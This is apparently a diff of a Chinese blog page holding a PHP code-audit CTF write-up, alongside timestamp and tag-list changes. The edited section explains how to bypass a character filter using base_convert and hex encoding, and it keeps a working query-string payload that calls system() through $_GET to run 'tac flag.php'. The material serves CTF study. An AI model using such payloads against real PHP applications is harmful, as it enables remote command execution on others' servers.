@@ -23,7 +23,7 @@
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmggy1g62geuwux9j30z40cygnd.jpg">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmggy1g62kn2agrnj30ya02umx3.jpg">
 <meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmggy1g62knm3xg8j30oy0j6gmq.jpg">
-<meta property="og:updated_time" content="2019-09-10T09:50:12.829Z">
+<meta property="og:updated_time" content="2019-11-03T04:36:16.470Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="几道代码审计题">
 <meta name="twitter:description" content="代码审计">
@@ -308,18 +308,13 @@
 
 <p>base_convert(1751504350,10,36)(base_convert(784,10,36))</p>
 <p>但是如果要用到符号，因为不能有字母，最后需要转成10进制，字符串先转成16进制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexdec(bin2hex(&apos;ls *&apos;));</span><br><span class="line">=&gt;1819684202</span><br><span class="line">base_convert(37907361743,10,36)(dechex(1819484202))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dechex()函数把十进制数转换为十六进制数</p>
+<p>hex2bin()函数把十六进制值的字符串转换为 ASCII字符</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexdec(bin2hex(&apos;ls *&apos;));</span><br><span class="line">=&gt;1819684202</span><br></pre></td></tr></table></figure>
 
 <p>成了，那继续研究怎么绕过长度限制吧。这里的思路，就是先拿到 _GET，然后用里面的参数来作为函数的名字（这里要读文件，就是 file_get_contents 了）和参数（文件路径）了。</p>
-<blockquote>
-<p>hex2bin()解码十六进制编码的二进制字符串。</p>
-<p>dechex()十进制到十六进制</p>
-<p>比如我们要_GET</p>
-<p>echo base_convert(‘hex2bin’,36,10)</p>
-<p>=&gt;    37907361743</p>
-<p>echo hexdec(hexdec(bin2hex(‘_GET’)))</p>
-<p>=&gt; 1598506324</p>
-</blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php</span><br><span class="line">=&gt;</span><br><span class="line">?$pi=hex2bin(5f474554)</span><br><span class="line">相当于</span><br><span class="line">$pi=_GET;</span><br><span class="line"></span><br><span class="line">($_GET[pi])($_GET[abs])</span><br></pre></td></tr></table></figure>
 
 <p>这里有用到一个trick，就是使用 <strong>{}</strong> 来代替 <strong>[]</strong> 进行数组索引</p>
@@ -595,19 +590,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">wp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">74cms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -631,11 +626,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">命令执行与代码执行</a>
+                <a href="javascript:void(0)" class="js-tag color3">codebreaking</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">codebreaking</a>
+                <a href="javascript:void(0)" class="js-tag color5">命令执行与代码执行</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -659,7 +654,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
+                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -667,15 +662,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">读书笔记</a>
+                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">php反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
               </li>
              
               <li class="article-tag-list-item">
